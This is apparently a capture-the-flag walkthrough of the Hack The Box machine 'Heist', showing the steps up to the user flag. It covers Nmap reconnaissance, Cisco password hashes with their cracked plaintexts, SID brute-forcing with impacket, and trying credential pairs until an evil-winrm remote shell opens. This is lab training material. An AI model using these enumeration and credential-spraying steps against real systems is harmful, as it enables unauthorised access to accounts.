<center><h1>Heist</h1></center>
<br>

Start with an Nmap scan

```
# nmap -sV -sC -T4 -p- 10.10.10.149
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 12:51 EDT
Nmap scan report for 10.10.10.149
Host is up (0.055s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m55s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-26T16:55:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.84 seconds
```
Next I take a look at port 80. We are greeted with a login page. I try some basic logins and get nothing so I click on "Login as guest". There I see a conversation between a user ```Hazard``` and ```Admin```. There is also and file attachment. Clicking on the reveals the following cisco configuration file.

<center><img src="/htb/heist/cisco.png"></center>

From this configer file we can gather 2 username and 3 hashed passwords. We can crack the two passwords for ```rout3r``` and ```admin``` using any cisco 7 password cracking website. The other 3rd hash we can use hashcat to crack.
```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent     
0242114B0E143F015F5D1E161713:$uperP@ssword
02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
```
Now that In have some usernames and passwords, I am going to use impackets ```lookupsid.py``` script to hopefully get some more useful information. This script basically allows you to bruteforce the Windows SID through MSRPC Interface, aiming at finding remote users/groups. Using the script gives me even more usernames
```
# ./lookupsid.py workgroup/hazard:stealth1agent@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
Now with all these Users/Passwords, I am going to use a tool called ```evil-winrm``` to get a shell on the machine. I just tried each user/pass combo until one worked.
```
# ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents>
```
Now I can grab the user flag located it ```C:\Users\Chase\Desktop```
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
a127daef77ab6d9d****************
```
